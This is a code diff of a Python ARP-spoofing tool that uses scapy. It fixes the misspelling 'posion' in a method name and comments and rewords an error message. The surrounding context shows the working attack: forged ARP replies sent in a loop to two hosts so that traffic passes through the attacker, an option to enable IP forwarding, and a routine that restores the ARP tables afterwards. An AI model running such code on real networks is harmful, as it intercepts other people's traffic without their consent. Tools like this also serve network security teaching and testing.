@@ -1,4 +1,3 @@
-
 from scapy.layers.l2 import Ether, ARP
 
 try:
@@ -43,11 +42,11 @@ class Attack(object):  # Function to be called after the attack
         self.target2 = target[1]
         self.interface = interface
 
-    def send_posion(self, MACS):
+    def send_poison(self, MACS):
         send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACS[0]),
-             iface=self.interface)  # Send ARP posion packet to target1
+             iface=self.interface)  # Send ARP poison packet to target1
         send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACS[1]),
-             iface=self.interface)  # Send ARP posion packet to target2
+             iface=self.interface)  # Send ARP poison packet to target2
 
     def send_fix(self, MACS):
         send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACS[0]),
@@ -104,7 +103,7 @@ if __name__ == '__main__':
             print('Sending poison packets')
 
     except IOError:
-        print('FAILED')
+        print('Failed to toggle IP forwarding')
         try:
             choice = input(
                 'Do you want to enable IP forwarding? [y/n] ')  # Ask user if they want to enable IP forwarding
@@ -123,7 +122,7 @@ if __name__ == '__main__':
     while 1:
         try:
             try:
-                Attack(targets, args.interface).send_posion(MACS)  # Send ARP posion packets to targets
+                Attack(targets, args.interface).send_poison(MACS)  # Send ARP poison packets to targets
             except Exception:
                 print('FAILED')
                 sys.exit(1)
@@ -139,7 +138,7 @@ if __name__ == '__main__':
     print("fixing Targets")
     for i in range(0, 16):
         try:
-            Attack(targets, args.interface).send_fix(MACS)  # Send ARP posion packets to targets
+            Attack(targets, args.interface).send_fix(MACS)  # Send ARP poison packets to targets
         except (Exception, KeyboardInterrupt):
             print('FAILED')
             sys.exit(1)
